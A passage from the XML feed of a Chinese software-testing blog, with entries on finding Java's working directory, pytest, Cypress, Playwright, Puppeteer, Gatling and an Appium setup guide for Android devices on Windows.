class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// System Property</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printCurrentWorkingDirectory1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String userDirectory = System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line">    System.out.println(userDirectory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Path, Java 7</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printCurrentWorkingDirectory2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String userDirectory = Paths.get(<span class="string">&quot;&quot;</span>)</span><br><span class="line">            .toAbsolutePath()</span><br><span class="line">            .toString();</span><br><span class="line">    System.out.println(userDirectory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// File(&quot;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printCurrentWorkingDirectory3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String userDirectory = <span class="keyword">new</span> File(<span class="string">&quot;&quot;</span>).getAbsolutePath();</span><br><span class="line">    System.out.println(userDirectory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// FileSystems</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printCurrentWorkingDirectory4</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String userDirectory = FileSystems.getDefault()</span><br><span class="line">            .getPath(<span class="string">&quot;&quot;</span>)</span><br><span class="line">            .toAbsolutePath()</span><br><span class="line">            .toString();</span><br><span class="line">    System.out.println(userDirectory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;得到当前代码运行的根目录路径？&quot;&gt;&lt;a href=&quot;#得到当前代码运行的根目录路径？&quot; class=&quot;headerlink&quot; title=&quot;得到当前代码运行的根目录路径？&quot;&gt;&lt;/a&gt;得到当前代码运行的根目录路径？&lt;/h2&gt;&lt;p&gt;可以参考地址： &lt;a href=&quot;h</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="java基础系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/java%E5%9F%BA%E7%A1%80%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="java基础" scheme="https://seniortesting.club/tags/java%E5%9F%BA%E7%A1%80/"/>
    
    <category term="文件操作" scheme="https://seniortesting.club/tags/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Pytest测试技巧和问题整理</title>
    <link href="https://seniortesting.club/posts/WSHjL5hXZo/"/>
    <id>https://seniortesting.club/posts/WSHjL5hXZo/</id>
    <published>2021-04-14T15:12:02.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    
    
    
    <category term="软件测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"/>
    
    <category term="自动化测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"/>
    
    <category term="接口自动化" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E6%8E%A5%E5%8F%A3%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
    <category term="pytest系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E6%8E%A5%E5%8F%A3%E8%87%AA%E5%8A%A8%E5%8C%96/pytest%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="pytest" scheme="https://seniortesting.club/tags/pytest/"/>
    
    <category term="测试技巧" scheme="https://seniortesting.club/tags/%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>Mocha测试技巧和问题整理</title>
    <link href="https://seniortesting.club/posts/sl2PABENIx/"/>
    <id>https://seniortesting.club/posts/sl2PABENIx/</id>
    <published>2021-04-14T15:11:30.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    
    
    
    <category term="软件测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"/>
    
    <category term="自动化测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"/>
    
    <category term="UI自动化" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/UI%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
    <category term="cypress系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/UI%E8%87%AA%E5%8A%A8%E5%8C%96/cypress%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="mocha" scheme="https://seniortesting.club/tags/mocha/"/>
    
    <category term="测试技巧" scheme="https://seniortesting.club/tags/%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>cypress系列(1) - cypress入门介绍</title>
    <link href="https://seniortesting.club/posts/8IhcXYrsze/"/>
    <id>https://seniortesting.club/posts/8IhcXYrsze/</id>
    <published>2021-04-14T15:11:30.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    
    
    
    <category term="软件测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"/>
    
    <category term="自动化测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"/>
    
    <category term="UI自动化" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/UI%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
    <category term="cypress系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/UI%E8%87%AA%E5%8A%A8%E5%8C%96/cypress%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="cypress" scheme="https://seniortesting.club/tags/cypress/"/>
    
    <category term="e2e testing" scheme="https://seniortesting.club/tags/e2e-testing/"/>
    
    <category term="ui testing" scheme="https://seniortesting.club/tags/ui-testing/"/>
    
    <category term="cypress系列" scheme="https://seniortesting.club/tags/cypress%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>playwright系列(1) - playwright入门介绍</title>
    <link href="https://seniortesting.club/posts/5mqEwWiLsK/"/>
    <id>https://seniortesting.club/posts/5mqEwWiLsK/</id>
    <published>2021-04-14T15:11:30.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://playwright.dev/python/" target="_blank" rel="noopener">官方Python学习文档</a></li><li><a href="https://github.com/microsoft/playwright-python" target="_blank" rel="noopener">官方仓库</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;headerlink&quot; title=&quot;参考链接&quot;&gt;&lt;/a&gt;参考链接&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://playwright.dev/python/&quot; target=&quot;_blank&quot;</summary>
      
    
    
    
    <category term="软件测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"/>
    
    <category term="自动化测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"/>
    
    <category term="UI自动化" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/UI%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
    <category term="playwright系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/UI%E8%87%AA%E5%8A%A8%E5%8C%96/playwright%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="python" scheme="https://seniortesting.club/tags/python/"/>
    
    <category term="cypress" scheme="https://seniortesting.club/tags/cypress/"/>
    
    <category term="e2e testing" scheme="https://seniortesting.club/tags/e2e-testing/"/>
    
    <category term="ui testing" scheme="https://seniortesting.club/tags/ui-testing/"/>
    
    <category term="playwright" scheme="https://seniortesting.club/tags/playwright/"/>
    
    <category term="playwright系列" scheme="https://seniortesting.club/tags/playwright%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>puppeteer系列(1) - puppeteer入门介绍</title>
    <link href="https://seniortesting.club/posts/1l2Gar1C9S/"/>
    <id>https://seniortesting.club/posts/1l2Gar1C9S/</id>
    <published>2021-04-14T15:11:30.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-puppeteer介绍"><a href="#1-puppeteer介绍" class="headerlink" title="1. puppeteer介绍"></a>1. puppeteer介绍</h2><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://playwright.dev/python/" target="_blank" rel="noopener">官方Python学习文档</a></li><li><a href="https://github.com/microsoft/playwright-python" target="_blank" rel="noopener">官方仓库</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-puppeteer介绍&quot;&gt;&lt;a href=&quot;#1-puppeteer介绍&quot; class=&quot;headerlink&quot; title=&quot;1. puppeteer介绍&quot;&gt;&lt;/a&gt;1. puppeteer介绍&lt;/h2&gt;&lt;h2 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链</summary>
      
    
    
    
    <category term="软件测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"/>
    
    <category term="自动化测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"/>
    
    <category term="UI自动化" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/UI%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
    <category term="puppeteer系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/UI%E8%87%AA%E5%8A%A8%E5%8C%96/puppeteer%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="python" scheme="https://seniortesting.club/tags/python/"/>
    
    <category term="e2e testing" scheme="https://seniortesting.club/tags/e2e-testing/"/>
    
    <category term="ui testing" scheme="https://seniortesting.club/tags/ui-testing/"/>
    
    <category term="playwright" scheme="https://seniortesting.club/tags/playwright/"/>
    
    <category term="puppeteer" scheme="https://seniortesting.club/tags/puppeteer/"/>
    
    <category term="puppeteer系列" scheme="https://seniortesting.club/tags/puppeteer%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>Windows环境下appium的server，client端连接配置</title>
    <link href="https://seniortesting.club/posts/OvVxU2q7eB/"/>
    <id>https://seniortesting.club/posts/OvVxU2q7eB/</id>
    <published>2021-04-14T15:11:10.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<p>ArtiPub (Article Publisher的简称，意为”文章发布者”)是一款开源的一文多发平台，可以帮助文章作者将编写好的文章自动发布到掘金、SegmentFault、CSDN、知乎、开源中国等技术媒体平台，传播优质知识，获取最大的曝光度。ArtiPub安装简单，提供了多种安装方式，可以一键安装使用，安装一般只要5分钟。</p><h2 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h2><ol><li><p>在appium-desktop中下载对应的Windows安装包，下载地址： <a href="https://github.com/appium/appium-desktop/releases" target="_blank" rel="noopener">https://github.com/appium/appium-desktop/releases</a></p></li><li><p>打开命令行切换到appium-desktop安装路径，确认是否配置正确：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install appium-doctor -g</span><br><span class="line">&gt; appium-doctor --ios  检测ios设备配置信息</span><br><span class="line">&gt; appium-doctor --android 检测android设备配置信息</span><br></pre></td></tr></table></figure><p>Appium的客户端和服务端之间进行通信都必须在一个Session的上下文中进行。客户端在发起通信的时候首先会发送一个叫作“Desired Capabilities”的JSON对象给服务器。服务器收到该数据后，会创建一个session并将session的ID返回到客户端。之后客户端可以用该session的ID发送后续的命令。</p><p>Android（版本&gt;4.3）：UIAutomator，Android 4.3之后系统自带的UI自动化测试工具<br>iOS：UIAutomation，iOS系统自带的UI自动化测试工具。</p><p>电脑（client）上运行自动化测试脚本，调用的是webdriver的接口，appium server接收到我们client上发送过来的命令后他会将这些命令转换为UIautomator认识的命令，然后由UIautomator来在设备上执行自动化</p><p>Appium Server的图形界面。 可以设置选项，启动/停止服务器，查看日志等…也不需要使用Node 的NPM来安装Appium，因为Node运行时与Appium Desktop捆绑在一起。</p><p>Appium的客户端和服务端之间进行通信都必须在一个Session的上下文中进行。客户端在发起通信的时候首先会发送一个叫作“Desired Capabilities”的JSON对象给服务器。服务器收到该数据后，会创建一个session并将session的ID返回到客户端。之后客户端可以用该session的ID发送后续的命令。</p><ol start="3"><li>安装安卓SDK（可以对手机进行连接操作，包括获取id，设备名，包名等）</li></ol><p>　1、下载安卓SDK安装包，地址：<a href="http://tools.android-studio.org/index.php/sdk" target="_blank" rel="noopener">http://tools.android-studio.org/index.php/sdk</a></p><p>　2、安装完成或者解压完成后，进入目录中打开：SDK Manager.exe</p><p>　3、我们使用真机测试，不需要安装模拟器镜像，暂时只需要安装Tools和Platform-tools，以后有需要可以继续安装</p><ol start="4"><li>获取手机的设备信息</li></ol><p>4.1. 打开命令提示符，定位到<strong>platform-tools</strong>的目录下，输入：<code>adb devices</code> 命令查看连接的手机。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">E:\AndroidSDK\platform-tools&gt;adb devices</span><br><span class="line">* daemon not running; starting now at tcp:5037</span><br><span class="line">* daemon started successfully</span><br><span class="line">List of devices attached</span><br><span class="line">688190fa0705    device</span><br></pre></td></tr></table></figure><p>4.2. 打开小米手机在设置——我的设备——全部参数中，记下“Android版本”的版本号。<br>4.3.  清空后台的所有程序，打开计算器，然后打开命令提示符，定位到adb所在的目录路径<br>，输入命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">dumpsys window | grep &quot;mCurrentFocus&quot;</span><br></pre></td></tr></table></figure><p>记下当前激活的窗口： com.miui.calculator和com.miui.calculator.cal.CalculatorActivity<br><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200903082117-2020-09-03.png" alt="20200903082117-2020-09-03"></p><p>4.4 启动appium-desktop，点击右上角的放大镜，在弹出的页面中输入前面3步所获取到的值，然后点击Start Session即可连接，如图：<br><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200903082236-2020-09-03.png" alt="20200903082236-2020-09-03"></p><p>打开新的session窗口后在<code>Desired Capabilities</code>中输入如下配置参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;deviceName&quot;: &quot;688190fa0705&quot;,</span><br><span class="line">  &quot;platformVersion&quot;: &quot;10 QKQ1.19104.001&quot;,</span><br><span class="line">  &quot;platformName&quot;: &quot;Android&quot;,</span><br><span class="line">  &quot;appPackage&quot;: &quot;com.miui.calculator&quot;,</span><br><span class="line">  &quot;appActivity&quot;: &quot;com.miui.calculator.cal.CalculatorActivity&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击“<strong>Start Session</strong>“ 进行调试运行。</p><h2 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h2><p>比如对应的python的客户端包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install appium-python-client</span><br></pre></td></tr></table></figure><p>编写客户端代码（python），点击运行即可驱动真机进行计算</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from appium import webdriver # 导入appium包</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 连接手机app初始化的一些信息</span><br><span class="line">desc &#x3D; &#123;&#125;</span><br><span class="line">desc[&#39;deviceName&#39;]&#x3D;&#39;PNMxxxxxxxxxUQK&#39;# 手机设备名称，adb devices</span><br><span class="line">desc[&#39;platformVersion&#39;]&#x3D;&#39;5.0.2&#39;# 手机版本，在手机中：设置--关于手机</span><br><span class="line">desc[&#39;platformName&#39;]&#x3D;&#39;Android&#39; # 手机类型，ios或android</span><br><span class="line">desc[&#39;appPackage&#39;]&#x3D;&#39;com.miui.calculator&#39;#包名</span><br><span class="line">desc[&#39;appActivity&#39;]&#x3D;&#39;com.miui.calculator.cal.CalculatorActivity&#39;#启动入口</span><br><span class="line"></span><br><span class="line">driver&#x3D;webdriver.Remote(&#39;http:&#x2F;&#x2F;127.0.0.1:4723&#x2F;wd&#x2F;hub&#39;,desc)#访问服务接口，并启动手机app</span><br><span class="line"></span><br><span class="line">time.sleep(20)</span><br><span class="line">driver.find_element_by_id(&#39;com.miui.calculator:id&#x2F;btn_6_s&#39;).click()</span><br><span class="line">time.sleep(2)</span><br><span class="line">driver.find_element_by_id(&#39;com.miui.calculator:id&#x2F;btn_plus_s&#39;).click()</span><br><span class="line">driver.find_element_by_id(&#39;com.miui.calculator:id&#x2F;btn_2_s&#39;).click()</span><br><span class="line">driver.find_element_by_id(&#39;com.miui.calculator:id&#x2F;btn_equal_s&#39;).click()</span><br><span class="line"></span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure><h2 id="真机或者模拟器配置"><a href="#真机或者模拟器配置" class="headerlink" title="真机或者模拟器配置"></a>真机或者模拟器配置</h2><ol><li>打开USB调试</li></ol><p>　设置——我的设备——全部参数——对着“MIUI版本”那一项点7次，会提示开发者选项打开。然后回到 设置——更多设置——开发者选项，将“<strong>开启开发者选项</strong>”、“<strong>USB调试</strong>”的开关设置为开启状态。<br><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200903081628-2020-09-03.png" alt="20200903081628-2020-09-03"></p><ol start="2"><li>在点击“Start Sesssion”后记得点击允许安装对应的<strong>appium-settings.apk</strong>和 <strong>appium-uiautomator2-server-v4.11.0.apk</strong>包，或者也可以自己进行安装，安装包位置位于appium的安装目录下面：</li></ol><p><code>E:\\WindowsApps\\Appium-windows-1.18.0-1\\resources\\app\\node_modules\\appium\\node_modules\\io.appium.settings\\apks\\settings_apk-debug.apk</code></p><h2 id="错误问题"><a href="#错误问题" class="headerlink" title="错误问题"></a>错误问题</h2><ol><li>An unknown server-side error occurred while processing the command. Original error: Neither ANDROID_HOME nor ANDROID_SDK_ROOT environment variable was exported. Read <a href="https://developer.android.com/studio/command-line/variables" target="_blank" rel="noopener">https://developer.android.com/studio/command-line/variables</a> for more details</li></ol><p><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200903081012-2020-09-03.png" alt="20200903081012-2020-09-03"></p><p>解决方法： 按照提示在环境变量里面添加： <code>ANDROID_HOME</code></p><ol start="2"><li>An unknown server-side error occurred while processing the command. Original error: pkg: /data/local/tmp/appium_cache/728413456b8xxxxxxxxxxxxd6bd577ca6418.apk Failure [INSTALL_FAILED_USER_RESTRICTED]</li></ol><p>解决方法： 请在开发者选项中打开USB安装、USB调试（安全设置）的开关。开关打开后，会安装一个<strong>appium setting</strong>的APP，安装完即可进行连接。</p><ol start="3"><li>An unknown server-side error occurred while processing the command. Original error: Error executing adbExec. Original error: ‘Command ‘E:\AndroidSDK\platform-tools\adb.exe -P 5037 -s 688190fa0705 install -g E:\WindowsApps\Appium-windows-1.18.0-1\resources\app\node_modules\appium\node_modules\io.appium.settings\apks\settings_apk-debug.apk’ exited with code 1’; Stderr: ‘adb: failed to install E:\WindowsApps\Appium-windows-1.18.0-1\resources\app\node_modules\appium\node_modules\io.appium.settings\apks\settings_apk-debug.apk: Failure [INSTALL_FAILED_USER_RESTRICTED: Install canceled by user]’; Code: ‘1’</li></ol><p>解决方法： 打开Session后会在你的手机设备上安装一个appium-settings.apk的安装包，很多手机会阻止安装，你需要打开你的手机，在弹出的提示里允许进行操作安装apk。</p><ol start="4"><li>An unknown server-side error occurred while processing the command. Original error: Error executing adbExec. Original error: ‘Command ‘E:\AndroidSDK\platform-tools\adb.exe -P 5037 -s 688190fa0705 install -r –no-incremental E:\WindowsApps\Appium-windows-1.18.0-1\resources\app\node_modules\appium\node_modules\appium-uiautomator2-server\apks\appium-uiautomator2-server-v4.11.0.apk’ exited with code 1’; Stderr: ‘adb: failed to install E:\WindowsApps\Appium-windows-1.18.0-1\resources\app\node_modules\appium\node_modules\appium-uiautomator2-server\apks\appium-uiautomator2-server-v4.11.0.apk: Failure [INSTALL_FAILED_USER_RESTRICTED: Install canceled by user]’; Code: ‘1’</li></ol><p>解决方法： 同上步骤，你需要在你的手机设备上允许安装一个操作安卓设备的<strong>uiautomator2</strong>，名称为： appium-uiautomator2-server-v4.11.0.apk</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ArtiPub (Article Publisher的简称，意为”文章发布者”)是一款开源的一文多发平台，可以帮助文章作者将编写好的文章自动发布到掘金、SegmentFault、CSDN、知乎、开源中国等技术媒体平台，传播优质知识，获取最大的曝光度。ArtiPub安装简单，</summary>
      
    
    
    
    <category term="软件测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"/>
    
    <category term="自动化测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"/>
    
    <category term="App手机测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/App%E6%89%8B%E6%9C%BA%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="appium" scheme="https://seniortesting.club/tags/appium/"/>
    
    <category term="mobile testing" scheme="https://seniortesting.club/tags/mobile-testing/"/>
    
    <category term="python" scheme="https://seniortesting.club/tags/python/"/>
    
    <category term="自动化测试" scheme="https://seniortesting.club/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"/>
    
    <category term="测试工具" scheme="https://seniortesting.club/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>gatling系列(1) - gatling入门介绍</title>
    <link href="https://seniortesting.club/posts/L1r0KGvwi6/"/>
    <id>https://seniortesting.club/posts/L1r0KGvwi6/</id>
    <published>2021-04-14T15:11:10.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    
    
    
    <category term="软件测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"/>
    
    <category term="自动化测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"/>
    
    <category term="性能自动化" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E6%80%A7%E8%83%BD%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
    
    <category term="gatling" scheme="https://seniortesting.club/tags/gatling/"/>
    
    <category term="performance testing" scheme="https://seniortesting.club/tags/performance-testing/"/>
    
  </entry>
  
  <entry>
    <title>pytest系列(1) - pytest入门介绍</title>
    <link href="https://seniortesting.club/posts/Sc7u6tMno6/"/>
    <id>https://seniortesting.club/posts/Sc7u6tMno6/</id>
    <published>2021-04-14T03:45:57.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pytest入门介绍"><a href="#pytest入门介绍" class="headerlink" title="pytest入门介绍"></a>pytest入门介绍</h2><p>pytest是python的一种单元测试框架，与python自带的<code>unittest</code>测试框架类似，但是比<code>unittest</code>框架使用起来更简洁，效率更高。</p><p>优点:</p><ul><li>非常容易上手，入门简单，文档丰富，文档中有很多实例可以参考</li><li>能够支持简单的单元测试和复杂的功能测试</li><li>支持参数化</li><li>执行测试过程中可以将某些测试跳过，或者对某些预期失败的case标记成失败</li><li>支持重复执行失败的case</li><li>支持运行由nose, unittest编写的测试case</li><li>具有很多第三方插件，并且可以自定义扩展</li><li>方便的和持续集成工具集成</li></ul><h2 id="pytest的安装"><a href="#pytest的安装" class="headerlink" title="pytest的安装"></a>pytest的安装</h2><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://docs.pytest.org/en/stable/" target="_blank" rel="noopener">pytest官方文档</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;pytest入门介绍&quot;&gt;&lt;a href=&quot;#pytest入门介绍&quot; class=&quot;headerlink&quot; title=&quot;pytest入门介绍&quot;&gt;&lt;/a&gt;pytest入门介绍&lt;/h2&gt;&lt;p&gt;pytest是python的一种单元测试框架，与python自带的&lt;code</summary>
      
    
    
    
    <category term="软件测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"/>
    
    <category term="自动化测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"/>
    
    <category term="接口自动化" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E6%8E%A5%E5%8F%A3%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
    <category term="pytest系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E6%8E%A5%E5%8F%A3%E8%87%AA%E5%8A%A8%E5%8C%96/pytest%E7%B3%BB%E5%88%97/"/>
    
    
